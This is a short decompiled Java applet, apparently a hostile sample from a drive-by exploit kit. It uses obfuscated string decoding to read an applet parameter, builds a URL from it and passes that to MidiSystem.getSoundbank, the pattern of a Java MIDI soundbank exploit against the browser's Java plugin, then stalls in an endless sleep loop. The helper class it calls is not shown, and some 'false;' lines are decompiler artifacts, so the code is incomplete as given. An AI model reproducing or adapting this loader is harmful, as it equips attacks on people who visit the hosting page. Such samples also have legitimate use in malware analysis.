import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class main extends Applet
{
    public main() {
        false;
    }
    
    @Override
    public void init() {
        false;
        if (!applet.__I()) {
            return;
        }
        false;
        try {
            applet.__N(this.getParameter(a9cefd44a6e982ab59772c65938717b7f("[.")));
            MidiSystem.getSoundbank(new URL(applet.__S()));
            while (true) {
                Thread.sleep(9L);
            }
        }
        catch (Exception ex) {
            false;
        }
    }
    
    public static String a9cefd44a6e982ab59772c65938717b7f(final String s) {
        return applet.__A(s, "2JiwqU&#/KQ40CYZLpudyT.%?B3Ge6SIstDWExgc1hrPj5f8a9RXNb=VA_-vOoFkznlMm:H7");
    }
}
